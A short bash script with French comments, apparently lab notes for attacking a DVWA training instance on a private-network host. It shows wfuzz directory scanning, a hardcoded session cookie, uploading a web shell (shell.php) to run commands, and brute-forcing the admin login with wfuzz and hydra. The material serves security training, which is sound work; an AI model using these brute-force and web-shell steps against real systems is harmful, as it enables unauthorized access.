#!/bin/bash

# Scan de directory sur la machine présente
wfuzz -w directory.txt -v http://192.168.4.124/FUZZ 

# On trouve le cookie de session (via le navigateur web - explication des infos)
# sur l'élément qui nous interesse
PHPSESSID="1r14hj2f6imf6p86oe0utq1g9c"

# Le principe de upload de fichier.
On accède à la page 
http://192.168.4.124/dvwa/vulnerabilities/upload/
On dépose le fichier shell.php

On accède au fichier via le lien de lecture des dépots : 
# On lance l'attaque brute force sur la machine cible
http://192.168.4.124/dvwa/hackable/uploads/shell.php

On peux ensuite executer des commandes dans le formulaire

# On lance l'attaque brute force sur la machine cible

## avec wfuzz
#wfuzz -H "Cookie:PHPSESSID=${PHPSESSID}; \
# security=low" \
wfuzz -H "Cookie:security=low" \
 --hs "Username and/or password incorrect." \
 -c -z file,passwords.txt \
"http://192.168.4.124/dvwa/vulnerabilities/brute/?username=admin&password=FUZZ&Login=Login#"

## avec hydra
#http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=${PHPSESSID}; security=low :F=Username and/or password incorrect."

hydra 192.168.4.124 -l admin \
   -P ./passwords.txt \
   http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low :F=Username and/or password incorrect."
